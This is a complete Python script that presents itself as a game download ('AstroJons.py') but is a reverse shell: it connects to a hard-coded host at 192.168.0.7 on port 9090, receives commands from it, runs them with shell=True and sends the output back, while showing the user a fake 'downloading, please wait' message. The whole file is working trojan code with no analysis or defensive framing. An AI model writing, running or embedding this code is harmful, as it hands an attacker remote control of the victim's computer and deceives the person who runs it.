import socket as sk
import subprocess as sp

HOST = "192.168.0.7"
PORT = 9090
ADDR = (HOST, PORT)
FORMAT = "utf-8"

sheep = sk.socket(sk.AF_INET, sk.SOCK_STREAM)
sheep.connect(ADDR)

CONNECTED = True

print("[ THE GAME ( 'AstroJons.py' ) IS DOWNLOADING...] - [ PLEASE WAIT, IT WILL TAKE SOME TIME : ) ]")

while CONNECTED:

    try:
        
        cmd = sheep.recv(4096).decode(FORMAT)

        if cmd == "!QUIT":
            
            CONNECTED = False
            sheep.close()
            break
        
        
        if cmd.strip() == "":
           
            continue

        
        result = sp.run(cmd, shell=True, capture_output=True, text=True)

        
        output = result.stdout + result.stderr

        
        if output == "":
            output = "[No output returned]\n"

        
        sheep.send(output.encode(FORMAT))

    except Exception as e:
    
       
        CONNECTED = False
        sheep.close()
        break
